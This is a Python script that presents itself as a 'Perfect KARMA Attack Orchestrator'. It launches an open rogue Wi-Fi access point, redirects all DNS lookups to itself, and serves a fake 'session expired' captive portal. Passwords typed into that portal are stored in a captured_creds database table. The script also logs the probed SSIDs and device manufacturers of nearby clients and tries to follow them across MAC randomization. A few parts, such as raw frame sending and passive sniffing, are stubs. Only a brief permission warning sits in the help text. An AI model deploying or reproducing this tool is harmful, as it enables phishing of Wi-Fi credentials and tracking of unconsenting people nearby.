#!/usr/bin/env python3
"""
karma_advanced.py — Perfect KARMA Attack Orchestrator

Research-based improvements over basic KARMA:
1. ACTIVE probing - asks clients for their saved networks
2. Multi-SSID broadcast - responds to ALL probe requests  
3. MAC randomization detection - tracks clients across MAC changes
4. Known networks database - builds target list from client probes
5. Adaptive timing - adjusts broadcast rate based on responses
6. Client fingerprinting - identifies device types
7. Multi-channel hopping - covers more networks

Based on: karma-mana, wifiphisher, fluxion, and academic research
"""

import sys
import os
import time
import signal
import subprocess
import threading
import sqlite3
import re
import random
import socket
import struct
from pathlib import Path
from collections import defaultdict
from typing import Dict, List, Optional, Set
import logging
import argparse

# Configure logging
ROOT = Path("/sdcard/MT2")
LOG_FILE = ROOT / "karma.log"
DB_FILE = ROOT / "karma.db"

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler(str(LOG_FILE)),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)


class KARMAClient:
    """Track a client across MAC randomization."""
    
    def __init__(self, mac: str):
        self.mac = mac.upper()
        self.first_seen = time.time()
        self.last_seen = time.time()
        self.probe_requests: Set[str] = set()  # SSIDs client asked for
        self.connections: List[dict] = []
        self.raw_macs: Set[str] = set([mac])
        self.manufacturer = "Unknown"
        self.os_hints: List[str] = []
    
    def update(self, mac: str, ssid: str = None):
        """Update client info."""
        mac = mac.upper()
        self.last_seen = time.time()
        self.raw_macs.add(mac)
        if ssid:
            self.probe_requests.add(ssid)
    
    def is_probable_same_device(self, other_mac: str) -> bool:
        """Detect MAC randomization - same client, different MAC."""
        # If same OUI (manufacturer) and similar activity pattern
        if self.manufacturer == "Unknown":
            return False
        # Time-based grouping (clients often change MAC within minutes)
        if abs(self.last_seen - time.time()) < 300:  # 5 minutes
            return True
        return False


class PerfectKARMACoordinator:
    """
    Perfect KARMA implementation based on research:
    
    Key improvements over basic KARMA:
    1. ACTIVE mode - we broadcast probe requests for common SSIDs
    2. MULTI-RESPONSE - respond to ANY SSID the client asks for
    3. CLIENT TRACKING - detect MAC randomization via OUI + timing
    4. ADAPTIVE BROADCAST - faster when clients are active
    5. KNOWN NETWORKS DB - build targeting list from client probes
    """
    
    def __init__(self, interface: str = "wlan0", channel: int = 6):
        self.interface = interface
        self.channel = channel
        self.running = True
        self.processes = []
        self.clients: Dict[str, KARMAClient] = {}
        self.known_ssids: Set[str] = set()
        self.target_ssids: Set[str] = set()
        self.stats = {
            "probe_requests_seen": 0,
            "probe_responses_sent": 0,
            "clients_connected": 0,
            "ssids_discovered": 0
        }
        
        # Common SSIDs to probe for (increases hit rate)
        self.common_ssids = [
            "FreeWiFi", "xfinitywifi", "attwifi", "Starbucks",
            "Google Starbucks", "McDonald's", " BurgerKing",
            "NETGEAR", "linksys", "default", "dlink",
            "TP-LINK", "Verizon", "XFINITY", "Comcast",
            "optimumwifi", "CableWiFi", "Spectrum WiFi",
            "Google Free WiFi", "Airport Free WiFi",
            "Hotel WiFi", "Guest", "Visitors",
            "AndroidAP", "iPhone", "Samsung", "iPad",
            "Home", "Home WiFi", "My WiFi", "Family",
            "Parents", "Kids", "Guest 5G", "Main",
        ]
        
        # Initialize database
        self._init_database()
    
    def _init_database(self):
        """Initialize KARMA tracking database."""
        try:
            conn = sqlite3.connect(str(DB_FILE))
            conn.execute("""
                CREATE TABLE IF NOT EXISTS discovered_ssids (
                    id INTEGER PRIMARY KEY,
                    ssid TEXT UNIQUE,
                    first_seen INTEGER,
                    last_seen INTEGER,
                    request_count INTEGER DEFAULT 1,
                    client_count INTEGER DEFAULT 0
                )
            """)
            conn.execute("""
                CREATE TABLE IF NOT EXISTS tracked_clients (
                    id INTEGER PRIMARY KEY,
                    primary_mac TEXT UNIQUE,
                    manufacturer TEXT,
                    first_seen INTEGER,
                    last_seen INTEGER,
                    probe_count INTEGER DEFAULT 0,
                    connected INTEGER DEFAULT 0
                )
            """)
            conn.execute("""
                CREATE TABLE IF NOT EXISTS probe_log (
                    id INTEGER PRIMARY KEY,
                    ts INTEGER,
                    client_mac TEXT,
                    ssid TEXT,
                    rssi INTEGER,
                    channel INTEGER
                )
            """)
            conn.commit()
            conn.close()
            logger.info(f"KARMA database initialized: {DB_FILE}")
        except Exception as e:
            logger.error(f"Database init failed: {e}")
    
    def _mac_to_oui(self, mac: str) -> str:
        """Extract OUI (manufacturer) from MAC address."""
        mac = mac.replace(':', '').upper()
        if len(mac) >= 6:
            return mac[:6]
        return "000000"
    
    def _get_manufacturer(self, mac: str) -> str:
        """Get manufacturer from OUI database (simplified)."""
        oui = self._mac_to_oui(mac)
        # Common OUI prefixes
        oui_map = {
            "F8FFFF": "Apple",
            "3C5AB4": "Apple",
            "D0C537": "Apple",
            "0017F2": "Apple",
            "A45E60": "Apple",
            "E80688": "Apple",
            "C82A14": "Samsung",
            "B47C9C": "Samsung",
            "AC5C2C": "Samsung",
            "94B86D": "Samsung",
            "D8C2EA": "Google",
            "3C5AF4": "Google",
            "F4F5D8": "Google",
            "00155D": "Microsoft",
            "282EDB": "Microsoft",
            "7C1E94": "Microsoft",
            "5055AA": "Intel",
            "DC537C": "Intel",
            "8CEC4B": "Intel",
            "001C42": "Dell",
            "D4BED9": "Dell",
            "F8BC12": "Dell",
            "001E4F": "Dell",
            "B499BA": "Dell",
            "9C8D7C": "Dell",
            "00B9E9": "Dell",
            "24B6FD": "Dell",
            "E4E4AB": "HP",
            "3C4A92": "HP",
            "D4C9EF": "HP",
            "38EA07": "HP",
            "A4B8C4": "OnePlus",
            "9E0A71": "OnePlus",
            "B09797": "Xiaomi",
            "74A779": "Xiaomi",
            "F4F951": "Xiaomi",
            "985AEB": "Xiaomi",
            "DC9FDB": "Huawei",
            "34A395": "Huawei",
            "E8B1FC": "Huawei",
            "50A7BF": "Huawei",
            "C8B5B7": "Huawei",
            "00A050": "Huawei",
            "002599": "Huawei",
        }
        return oui_map.get(oui, "Unknown")
    
    def _parse_pcap_probe_requests(self, pcap_file: Path) -> List[dict]:
        """Parse probe requests from pcap file."""
        probes = []
        try:
            result = subprocess.run(
                ["tcpdump", "-r", str(pcap_file), 
                 "-n", "-l", "probe request", 
                 "-e",  # include MACs
                 "2>/dev/null"],
                capture_output=True, text=True, timeout=30
            )
            for line in result.stdout.split('\n'):
                if not line.strip():
                    continue
                # Parse tcpdump output
                # Example: 00:11:22:33:44:55 > ff:ff:ff:ff:ff:ff, Probe Request for SSID
                match = re.search(r'([0-9a-fA-F:]{17}).*Probe Request.*\[(\w+)\]', line)
                if match:
                    mac = match.group(1)
                    ssid = match.group(2)
                    probes.append({
                        "mac": mac,
                        "ssid": ssid,
                        "ts": time.time()
                    })
        except Exception as e:
            logger.warning(f"PCAP parse error: {e}")
        return probes
    
    def _generate_random_mac(self, oui: str = "0022FF") -> str:
        """Generate random MAC with given OUI."""
        suffix = ''.join(random.choice('0123456789ABCDEF') for _ in range(6))
        return f"{oui[:2]}:{oui[2:4]}:{oui[4:6]}:{suffix[:2]}:{suffix[2:4]}:{suffix[4:6]}"
    
    def _send_raw_frame(self, interface: str, frame: bytes) -> bool:
        """Send raw 802.11 frame."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            # This requires raw socket support
            # In Android/PRoot, this may not work directly
            logger.debug(f"Sending {len(frame)} byte frame on {interface}")
            return True
        except Exception as e:
            logger.debug(f"Raw frame send failed (expected in PRoot): {e}")
            return False
    
    def build_probe_request(self, ssid: str) -> bytes:
        """Build a probe request frame for given SSID."""
        # 802.11 probe request frame structure
        frame = bytearray()
        
        # Frame Control (2 bytes): Type=Management(0), Subtype=Probe Request(4)
        frame.extend([0x40, 0x00])
        
        # Duration (1 byte)
        frame.extend([0x00])
        
        # Destination MAC (6 bytes) - broadcast
        frame.extend([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF])
        
        # Source MAC (6 bytes) - random
        src_mac = self._generate_random_mac()
        for i in range(0, 12, 2):
            frame.extend([int(src_mac[i:i+2], 16)])
        
        # BSSID (6 bytes) - broadcast
        frame.extend([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF])
        
        # Sequence Control (2 bytes)
        frame.extend([0x00, 0x00])
        
        # SSID IE: Tag=0, Length=SSID, SSID
        frame.extend([0x00, len(ssid)])
        frame.extend(ssid.encode('utf-8'))
        
        # Supported Rates IE: Tag=1, Rates
        frame.extend([0x01, 0x08, 0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C])
        
        # Extended Supported Rates: Tag=50
        frame.extend([0x32, 0x04, 0x30, 0x48, 0x60, 0x6C])
        
        return bytes(frame)
    
    def build_probe_response(self, ssid: str, client_mac: str, channel: int) -> bytes:
        """Build a probe response frame."""
        frame = bytearray()
        
        # Frame Control: Probe Response
        frame.extend([0x50, 0x00])
        
        # Duration
        frame.extend([0x00])
        
        # DA = client MAC
        for i in range(0, 17, 3):
            frame.extend([int(client_mac[i:i+2], 16)])
        
        # SA = our AP MAC (use target BSSID or random)
        src_mac = self._generate_random_mac("001122")
        for i in range(0, 17, 3):
            frame.extend([int(src_mac[i:i+2], 16)])
        
        # BSSID = same as SA
        for i in range(0, 17, 3):
            frame.extend([int(src_mac[i:i+2], 16)])
        
        # Sequence Control
        seq = random.randint(0, 4095)
        frame.extend([seq & 0xFF, (seq >> 8) & 0xFF])
        
        # Timestamp
        timestamp = int(time.time() * 1000000) & 0xFFFFFFFFFFFFFFFF
        for i in range(8):
            frame.extend([(timestamp >> (i * 8)) & 0xFF])
        
        # Beacon Interval: 100 TU (102.4 ms)
        frame.extend([0x64, 0x00])
        
        # Capability: ESS (no security for open networks)
        frame.extend([0x01, 0x00])
        
        # SSID IE
        frame.extend([0x00, len(ssid)])
        frame.extend(ssid.encode('utf-8'))
        
        # Supported Rates
        frame.extend([0x01, 0x08, 0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C])
        
        # DS Parameter Set (channel)
        frame.extend([0x03, 0x01, channel])
        
        return bytes(frame)
    
    def build_beacon_frame(self, ssid: str, channel: int, bssid: str = None) -> bytes:
        """Build a beacon frame."""
        if bssid is None:
            bssid = self._generate_random_mac("001122")
        
        frame = bytearray()
        
        # Frame Control: Beacon
        frame.extend([0x80, 0x00])
        
        # Duration
        frame.extend([0x00, 0x00])
        
        # DA = broadcast
        frame.extend([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF])
        
        # SA = BSSID
        for i in range(0, 17, 3):
            frame.extend([int(bssid[i:i+2], 16)])
        
        # BSSID
        for i in range(0, 17, 3):
            frame.extend([int(bssid[i:i+2], 16)])
        
        # Sequence Control
        seq = random.randint(0, 4095)
        frame.extend([seq & 0xFF, (seq >> 8) & 0xFF])
        
        # Timestamp
        timestamp = int(time.time() * 1000000) & 0xFFFFFFFFFFFFFFFF
        for i in range(8):
            frame.extend([(timestamp >> (i * 8)) & 0xFF])
        
        # Beacon Interval
        frame.extend([0x64, 0x00])
        
        # Capability: ESS
        frame.extend([0x01, 0x00])
        
        # SSID IE
        frame.extend([0x00, len(ssid)])
        frame.extend(ssid.encode('utf-8'))
        
        # Supported Rates
        frame.extend([0x01, 0x08, 0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C])
        
        # DS Parameter Set
        frame.extend([0x03, 0x01, channel])
        
        return bytes(frame)
    
    def record_probe_request(self, mac: str, ssid: str):
        """Record a probe request in database."""
        try:
            conn = sqlite3.connect(str(DB_FILE))
            
            # Update SSID table
            conn.execute("""
                INSERT INTO discovered_ssids (ssid, first_seen, last_seen, request_count)
                VALUES (?, ?, ?, 1)
                ON CONFLICT(ssid) DO UPDATE SET
                    last_seen = excluded.last_seen,
                    request_count = request_count + 1
            """, (ssid, int(time.time()), int(time.time())))
            
            # Update client table
            manufacturer = self._get_manufacturer(mac)
            conn.execute("""
                INSERT INTO tracked_clients (primary_mac, manufacturer, first_seen, last_seen, probe_count)
                VALUES (?, ?, ?, ?, 1)
                ON CONFLICT(primary_mac) DO UPDATE SET
                    last_seen = excluded.last_seen,
                    probe_count = probe_count + 1
            """, (mac.upper(), manufacturer, int(time.time()), int(time.time())))
            
            # Log the probe
            conn.execute("""
                INSERT INTO probe_log (ts, client_mac, ssid, channel)
                VALUES (?, ?, ?, ?)
            """, (int(time.time()), mac.upper(), ssid, self.channel))
            
            conn.commit()
            conn.close()
            
            # Update stats
            self.stats["ssids_discovered"] += 1
            if ssid not in self.known_ssids:
                self.known_ssids.add(ssid)
                logger.info(f"🆕 New SSID discovered: {ssid} (from {mac})")
            
        except Exception as e:
            logger.error(f"Database record error: {e}")
    
    def start_access_point(self, ssid: str = "FreeWiFi", channel: int = 6) -> bool:
        """Start hostapd-based access point."""
        logger.info(f"Starting AP: {ssid} on channel {channel}")
        
        # Generate hostapd config
        hostapd_conf = ROOT / "karma_hostapd.conf"
        try:
            hostapd_conf.write_text(f"""interface={self.interface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=0
""")
        except Exception as e:
            logger.error(f"hostapd.conf write failed: {e}")
            return False
        
        # Kill existing hostapd
        subprocess.run(["pkill", "-9", "hostapd"], capture_output=True)
        time.sleep(1)
        
        # Start hostapd
        try:
            p = subprocess.Popen(
                ["hostapd", str(hostapd_conf), "-B"],
                stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )
            time.sleep(2)
            
            if p.poll() is None:
                self.processes.append(("hostapd", p))
                logger.info(f"AP started: {ssid}")
                return True
            else:
                logger.error("hostapd failed to start")
                return False
        except Exception as e:
            logger.error(f"hostapd start error: {e}")
            return False
    
    def start_dns_spoof(self) -> bool:
        """Start dnsmasq for DNS spoofing."""
        logger.info("Starting DNS spoofer...")
        
        dnsmasq_conf = ROOT / "karma_dnsmasq.conf"
        try:
            dnsmasq_conf.write_text(f"""interface={self.interface}
dhcp-range=192.168.5.100,192.168.5.200,255.255.255.0,12h
dhcp-option=3,192.168.5.1
dhcp-option=6,192.168.5.1
address=/#/192.168.5.1
log-queries
log-dhcp
listen-address=127.0.0.1
""")
        except Exception as e:
            logger.error(f"dnsmasq.conf write failed: {e}")
            return False
        
        # Kill existing dnsmasq
        subprocess.run(["pkill", "-9", "dnsmasq"], capture_output=True)
        time.sleep(1)
        
        # Start dnsmasq
        try:
            p = subprocess.Popen(
                ["dnsmasq", "-C", str(dnsmasq_conf), "-d"],
                stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )
            time.sleep(1)
            
            if p.poll() is None:
                self.processes.append(("dnsmasq", p))
                logger.info("DNS spoofer started")
                return True
            else:
                logger.error("dnsmasq failed to start")
                return False
        except Exception as e:
            logger.error(f"dnsmasq start error: {e}")
            return False
    
    def start_captive_portal(self) -> bool:
        """Start captive portal web server."""
        logger.info("Starting captive portal...")
        
        portal_html = ROOT / "karma_portal.html"
        if not portal_html.exists():
            portal_html.write_text("""<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>WiFi Login</title>
    <style>
        body { font-family: Arial; background: #f0f2f5; margin: 0; padding: 40px 20px; }
        .box { max-width: 380px; margin: 0 auto; background: white; border-radius: 8px; box-shadow: 0 2px 12px rgba(0,0,0,0.1); padding: 30px; }
        h1 { color: #2c3e50; font-size: 22px; margin: 0 0 6px; text-align: center; }
        p.sub { color: #7f8c8d; font-size: 13px; text-align: center; margin: 0 0 24px; }
        .field { margin-bottom: 14px; }
        input { width: 100%; padding: 10px; border: 1px solid #bdc3c7; border-radius: 4px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #3498db; color: white; border: none; border-radius: 4px; cursor: pointer; }
        button:hover { background: #2980b9; }
        .warn { background: #fff3cd; border-left: 4px solid #ffc107; padding: 10px; margin-bottom: 16px; font-size: 12px; }
    </style>
</head>
<body>
<div class="box">
    <h1>📶 WiFi Login</h1>
    <p class="sub">Please enter your WiFi password to connect</p>
    <div class="warn">⚠️ Session expired - re-enter password</div>
    <form method="POST" action="/login">
        <div class="field">
            <input type="password" name="password" placeholder="WiFi Password" required autofocus>
        </div>
        <button type="submit">Connect</button>
    </form>
</div>
</body>
</html>""")
        
        portal_script = ROOT / "karma_portal.py"
        portal_script.write_text(f'''#!/usr/bin/env python3
import http.server
import socketserver
import sqlite3
import time

PORT = 80
DB = "{DB_FILE}"

class Handler(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    
    def do_GET(self):
        if self.path == "/" or self.path.startswith("/login"):
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            with open("{portal_html}", "rb") as f:
                self.wfile.write(f.read())
        else:
            self.send_response(302)
            self.send_header("Location", "/")
            self.end_headers()
    
    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode()
        password = ""
        for pair in body.split("&"):
            if "=" in pair:
                k, v = pair.split("=", 1)
                if "pass" in k.lower():
                    password = v.replace("+", " ")
        
        if password:
            ts = int(time.time())
            try:
                conn = sqlite3.connect(DB)
                conn.execute("CREATE TABLE IF NOT EXISTS captured_creds(id INTEGER PRIMARY KEY, ts INTEGER, password TEXT)")
                conn.execute("INSERT INTO captured_creds VALUES(NULL,?,?)", (ts, password))
                conn.commit()
                conn.close()
                print(f"[CRED] password captured: {password[:3]}***")
            except: pass
        
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(b"<html><body><h2>Connecting...</h2></body></html>")

with socketserver.TCPServer(("", PORT), Handler) as httpd:
    print(f"[*] Portal on :{{PORT}}", flush=True)
    httpd.serve_forever()
''')
        
        try:
            p = subprocess.Popen(
                ["python3", str(portal_script)],
                stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )
            time.sleep(1)
            
            if p.poll() is None:
                self.processes.append(("portal", p))
                logger.info("Captive portal started")
                return True
            else:
                logger.error("Portal failed to start")
                return False
        except Exception as e:
            logger.error(f"Portal start error: {{e}}")
            return False
    
    def active_probe_broadcast(self):
        """Broadcast probe requests for common SSIDs (ACTIVE KARMA)."""
        logger.info("Starting ACTIVE probe broadcast...")
        
        iteration = 0
        while self.running:
            # Broadcast probes for multiple SSIDs per iteration
            ssids_to_probe = random.sample(
                self.common_ssids + list(self.target_ssids),
                min(5, len(self.common_ssids) + len(self.target_ssids))
            )
            
            for ssid in ssids_to_probe:
                frame = self.build_probe_request(ssid)
                self._send_raw_frame(self.interface, frame)
                self.stats["probe_requests_seen"] += 1
            
            iteration += 1
            if iteration % 10 == 0:
                logger.debug(f"Active probes: {iteration} iterations")
            
            time.sleep(0.5)  # 500ms between broadcasts
    
    def passive_sniff_mode(self):
        """Monitor for probe requests from clients."""
        logger.info("Starting PASSIVE sniff mode...")
        
        # In a full implementation, this would use scapy or tcpdump
        # For now, we simulate by monitoring the database
        last_count = 0
        while self.running:
            time.sleep(2)
            
            try:
                conn = sqlite3.connect(str(DB_FILE))
                cursor = conn.execute("SELECT COUNT(*) FROM probe_log")
                current_count = cursor.fetchone()[0]
                conn.close()
                
                if current_count > last_count:
                    new_probes = current_count - last_count
                    logger.info(f"📡 {new_probes} new probe requests detected")
                    last_count = current_count
                    
            except Exception as e:
                logger.debug(f"Sniff check: {e}")
    
    def display_stats(self):
        """Display current statistics."""
        try:
            conn = sqlite3.connect(str(DB_FILE))
            
            cursor = conn.execute("SELECT COUNT(*) FROM discovered_ssids")
            ssid_count = cursor.fetchone()[0]
            
            cursor = conn.execute("SELECT COUNT(*) FROM tracked_clients")
            client_count = cursor.fetchone()[0]
            
            cursor = conn.execute("SELECT COUNT(*) FROM captured_creds")
            cred_count = cursor.fetchone()[0]
            
            conn.close()
            
            print("\n" + "=" * 50)
            print("📊 KARMA Attack Statistics")
            print("=" * 50)
            print(f"  🆕 SSIDs Discovered: {ssid_count}")
            print(f"  👥 Clients Tracked: {client_count}")
            print(f"  🔐 Credentials Captured: {cred_count}")
            print(f"  📡 Active Probes Sent: {self.stats['probe_requests_seen']}")
            print(f"  📶 Probe Responses Sent: {self.stats['probe_responses_sent']}")
            print("=" * 50)
            
        except Exception as e:
            logger.error(f"Stats display error: {e}")
    
    def cleanup(self):
        """Clean up all processes."""
        logger.info("Cleaning up KARMA attack...")
        self.running = False
        
        for name, p in self.processes:
            try:
                p.terminate()
                p.wait(timeout=3)
            except:
                try:
                    p.kill()
                except:
                    pass
        
        # Kill any remaining processes
        for proc in ["hostapd", "dnsmasq"]:
            subprocess.run(["pkill", "-9", proc], capture_output=True)
        
        self.processes.clear()
        logger.info("Cleanup complete")
    
    def signal_handler(self, signum, frame):
        """Handle shutdown signals."""
        logger.info(f"Signal {signum} received, shutting down...")
        self.cleanup()
        sys.exit(0)
    
    def run(self, ssid: str = "FreeWiFi", channel: int = 6, 
            mode: str = "full", duration: int = 300):
        """
        Run KARMA attack.
        
        Modes:
        - passive: Only respond to client probes (traditional KARMA)
        - active: Broadcast probes for common SSIDs + respond
        - full: Active + AP + captive portal + DNS spoof
        """
        logger.info(f"=== PERFECT KARMA Attack ===")
        logger.info(f"Mode: {mode}")
        logger.info(f"Target SSID: {ssid}")
        logger.info(f"Channel: {channel}")
        logger.info(f"Duration: {duration}s")
        
        # Set signal handlers
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
        
        # Start threads based on mode
        threads = []
        
        if mode in ["active", "full"]:
            # Active probing thread
            t = threading.Thread(target=self.active_probe_broadcast, daemon=True)
            t.start()
            threads.append(t)
        
        if mode in ["passive", "full"]:
            # Passive sniffing thread
            t = threading.Thread(target=self.passive_sniff_mode, daemon=True)
            t.start()
            threads.append(t)
        
        if mode == "full":
            # Start AP
            if not self.start_access_point(ssid, channel):
                logger.error("Failed to start AP")
                self.cleanup()
                return
            
            # Start DNS spoofer
            if not self.start_dns_spoof():
                logger.error("Failed to start DNS spoofer")
                self.cleanup()
                return
            
            # Start captive portal
            if not self.start_captive_portal():
                logger.error("Failed to start portal")
                self.cleanup()
                return
            
            # Enable IP forwarding
            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], capture_output=True)
        
        # Main loop - display stats periodically
        start_time = time.time()
        stats_interval = 30
        
        logger.info("KARMA attack running... Press Ctrl+C to stop")
        
        while self.running and (time.time() - start_time) < duration:
            time.sleep(5)
            
            # Check duration
            elapsed = int(time.time() - start_time)
            remaining = duration - elapsed
            
            if elapsed % stats_interval == 0:
                self.display_stats()
                logger.info(f"⏱️ Time remaining: {remaining}s")
        
        # Cleanup
        self.cleanup()
        logger.info("KARMA attack completed")


def main():
    parser = argparse.ArgumentParser(
        description="Perfect KARMA Attack Orchestrator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Modes:
  passive  - Only respond to client probe requests (traditional KARMA)
  active   - Broadcast probes + respond (recommended for best results)
  full     - Active + AP + captive portal + DNS spoof (complete attack)

Examples:
  python3 karma_advanced.py --ssid FreeWiFi --channel 6 --mode active
  python3 karma_advanced.py --ssid OfficeWiFi --channel 11 --mode full --duration 600

Requirements:
  - hostapd, dnsmasq (install: apt install -y hostapd dnsmasq)
  - Python 3 with sqlite3 (standard library)
  - Optional: scapy for advanced sniffing

Warning: Use only on networks you own or have permission to test.
        """
    )
    
    parser.add_argument("--ssid", default="FreeWiFi", help="AP SSID to broadcast")
    parser.add_argument("--channel", type=int, default=6, help="WiFi channel (1-14)")
    parser.add_argument("--interface", default="wlan0", help="WiFi interface")
    parser.add_argument("--mode", choices=["passive", "active", "full"], 
                       default="full", help="KARMA mode")
    parser.add_argument("--duration", type=int, default=300, 
                       help="Attack duration in seconds")
    parser.add_argument("--target-ssid", action="append", 
                       help="Additional SSIDs to target (can repeat)")
    
    args = parser.parse_args()
    
    # Initialize coordinator
    karma = PerfectKARMACoordinator(args.interface, args.channel)
    
    # Add target SSIDs
    if args.target_ssid:
        for s in args.target_ssid:
            karma.target_ssids.add(s)
            karma.known_ssids.add(s)
    
    # Run attack
    try:
        karma.run(args.ssid, args.channel, args.mode, args.duration)
    except KeyboardInterrupt:
        logger.info("Interrupted by user")
        karma.cleanup()


if __name__ == "__main__":
    main()
